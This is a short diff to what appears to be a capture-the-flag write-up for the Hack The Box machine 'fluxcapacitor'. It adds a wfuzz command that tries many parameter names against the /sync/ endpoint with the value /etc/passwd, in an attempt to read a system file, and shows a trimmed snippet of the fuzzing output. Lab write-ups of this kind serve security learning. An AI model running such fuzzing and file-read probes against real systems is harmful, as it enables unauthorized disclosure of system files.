@@ -31,6 +31,7 @@ most of these scripts do a lot more than just send back the timestamp, so lets c
 
 So lets boot up WFUZZ(a tool which will allow us to run many requests with one part of the url changed, in this case the variable name), and run it with the dirbuster common dirs and files wordlist:
 ```{r, engine='bash', count_lines}
+> wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 200 http://fluxcapacitor.htb/sync/?FUZZ=/etc/passwd
 ..snip..
 10703:  C=403      7 L	      10 W	    175 Ch	  "opt"
 ..snip..
